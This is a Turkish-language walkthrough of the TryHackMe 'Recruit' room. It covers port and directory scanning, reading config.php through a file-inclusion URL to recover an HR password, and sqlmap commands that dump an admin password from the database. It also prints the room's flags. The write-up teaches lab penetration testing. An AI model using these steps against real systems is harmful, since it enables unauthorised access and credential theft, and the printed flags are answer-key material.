# TryHackMe — Recruit Writeut

Recruit, TryHackMe üzerinde yer alan kolay seviye bir makine. Bir işe alım (recruitment) portalını simüle ediyor ve içerisinde bir dosya okuma (LFI) zafiyeti ile SQL Injection zafiyetini bir arada barındırıyor. Bu yazıda makineyi baştan sona nasıl ele geçirdiğimi, izlediğim yolu ve kullandığım komutları paylaşıyorum.

---

## Keşif

İlk adım olarak hedef üzerinde açık portları ve çalışan servisleri tespit etmek için `nmap` ile tam port taraması gerçekleştirdim.

```bash
nmap -sS -sC -sV -p- 10.112.184.173
```
<img width="804" height="409" alt="nmap tarama" src="https://github.com/user-attachments/assets/be79b3eb-7100-4713-bee8-acb3a4814ce8" />

Taramadan elde ettiğim bilgiler:

- **22/tcp** — OpenSSH 8.2p1 (Ubuntu)
- **53/tcp** — ISC BIND 9.16.1 (DNS servisi)
- **80/tcp** — Apache 2.4.41, sayfa başlığı "Recruit"

Asıl saldırı yüzeyinin **80 numaralı portta çalışan web uygulaması** olduğunu düşünerek buraya odaklandım.

---

## Web Uygulamasının İncelenmesi

Siteye gitmeden önce, hedefi IP yerine domain üzerinden de test edebilmek için `/etc/hosts` dosyasına bir kayıt ekledim:

```bash
echo "10.112.184.173 recruit.thm" | sudo tee -a /etc/hosts
```

Bu sayede hedefe hem IP hem de `recruit.thm` üzerinden erişebilir hale geldim.

Tarayıcı üzerinden `http://10.112.184.173` adresine gittiğimde bir **login sayfası** ile karşılaştım. Sayfanın altında **"Access API"** başlıklı bir bağlantı dikkatimi çekti; bu bağlantı beni `http://10.112.184.173/api.php` sayfasına yönlendirdi.

API dokümantasyon sayfasında şu bilgi yer alıyordu:

```
You can fetch a candidate CV using the following endpoint:
/file.php?cv=<URL>
```

Bu, klasik bir **Local/Remote File Inclusion** şüphesi uyandıran bir endpoint. `cv` parametresinin bir URL veya dosya yolu bekliyor olması, sunucu tarafında dosya okuma/dahil etme işlemi yapıldığına işaret ediyordu. Bu noktayı not alıp, önce dizin keşfine devam ettim.

---

## Dizin Tarama

Web sunucusu üzerinde gizli dizin ve dosyaları bulmak için `ffuf` kullandım.

```bash
ffuf -u http://10.112.184.173/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

<img width="1155" height="366" alt="ffuf tarama" src="https://github.com/user-attachments/assets/0ec67b8d-3637-40cb-b125-2c93f1361464" />

`/mail` dizini özellikle dikkatimi çekti çünkü tarayıcıdan erişilebilir durumdaydı ve normalde bu tür dizinlerin herkese açık olması beklenmez.

---

## Mail Log Dosyasının İncelenmesi

`/mail` dizinine gittiğimde `mail.log` isimli bir dosyaya erişebildiğimi fark ettim. İçeriğini inceleyince, IT ekibiyle HR ekibi arasında geçen bir sistem yöneticisi mail yazışması ile karşılaştım.

```
Subject: Recruitment Portal Deployment Confirmation

...
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.
...
```

Bu mail, sızma testi açısından oldukça değerli bir bilgi sızıntısıydı:

1. **HR kullanıcısının** parolası uygulama içerisinde, `config.php` dosyasında saklanıyor.
2. **Admin kullanıcısının** kimlik bilgileri ise veritabanında tutuluyor (bu bilgiyi ileride SQL Injection aşamasında değerlendirdim).

Ayrıca mail başlıklarında (`hr@recruit.thm`, `it-support@recruit.thm`) görülen adresler, hedefin `recruit.thm` domainini kullandığını da doğruladı.

---

## LFI ile config.php Dosyasının Okunması

Daha önce `api.php` sayfasında gördüğüm `/file.php?cv=<URL>` endpoint'ini, mail'den öğrendiğim `config.php` dosyasını okumak için kullandım:

```
http://10.112.184.173/file.php?cv=file://config.php
```

Sonuç başarılı oldu ve dosya içeriği doğrudan tarayıcıda görüntülendi:

<img width="948" height="655" alt="config php" src="https://github.com/user-attachments/assets/47eced95-2129-4747-a8d3-32e01d436f80" />

Buradan **HR kullanıcısının şifresini** ele geçirmiş oldum:

- **Username:** `hr`
- **Password:** `hrpassword123`

---

## İlk Giriş ve Flag #1

Elde ettiğim `hr / hrpassword123` bilgileriyle login sayfasından giriş yaptım ve ilk flag'e ulaştım.

<img width="1919" height="851" alt="ilk flag" src="https://github.com/user-attachments/assets/7ad62afd-d99b-4da9-a3fe-24479ef6d2dc" />

```
FLAG 1: THM{LOGGED_IN_USER}
```
---

## SQL Injection ile Admin Bilgisini Ele Geçirme

Panelde bir arama alanı bulunuyordu. Ekranda ID, username gibi kolonlarla birlikte kullanıcı verileri gözüktüğü ve bunların büyük ihtimalle bir veritabanından çekildiği aklıma gelince, bu arama alanının arkasında bir SQL sorgusu dönüyor olabileceğini düşündüm ve SQL Injection ihtimalini test etmeye karar verdim. Manuel testin zaman alacağını düşünerek, ilgili isteği Burp Suite ile yakalayıp `req.txt` dosyasına kaydettim ve `sqlmap` ile otomatik tarama gerçekleştirdim.

### Veritabanlarının Listelenmesi

```bash
sqlmap -r req.txt -p search --dbs --batch --fresh-queries
```

<img width="1215" height="587" alt="sqlçıktısı" src="https://github.com/user-attachments/assets/216c958c-5b9b-46ac-ac14-0345e144f3ca" />

Hedef uygulamayla doğrudan ilişkili olan `recruit_db` veritabanına odaklandım.

### Tabloların Listelenmesi

```bash
sqlmap -r req.txt -p search -D recruit_db --tables --batch --fresh-queries
```

<img width="1191" height="298" alt="tables" src="https://github.com/user-attachments/assets/98686069-1f08-465b-817b-149f17088847" />

### users Tablosunun Kolonlarının Listelenmesi

```bash
sqlmap -r req.txt -p search -D recruit_db -T users --columns --batch --fresh-queries
```

```
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int          |
| password | varchar(100) |
| username | varchar(50)  |
+----------+--------------+
```

### Tüm Verinin Dump Edilmesi

```bash
sqlmap -r req.txt -p search -D recruit_db --dump-all --batch --fresh-queries
```

**users tablosu:**

```
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | admin@001admin | admin    |
+----+----------------+----------+
```

<img width="1236" height="616" alt="alldatabase" src="https://github.com/user-attachments/assets/9f1e3c56-2d0c-418d-93dc-7013365a28ea" />

Bu adımda mail log'unda belirtilen "admin kimlik bilgileri veritabanında saklanıyor" ifadesinin doğruluğunu teyit etmiş oldum.

---

## Admin Girişi ve Flag #2

Ele geçirdiğim `admin / admin@001admin` bilgileriyle sisteme admin olarak giriş yaptım.

<img width="1918" height="830" alt="lastflag" src="https://github.com/user-attachments/assets/7a8a475f-7cc6-44fd-a56e-e201efd7cb06" />

```
FLAG 2: THM{LOGGED_IN_ADM1N1}
```

---

**Flag 1:** `THM{LOGGED_IN_USER}`
**Flag 2:** `THM{LOGGED_IN_ADM1N1}`
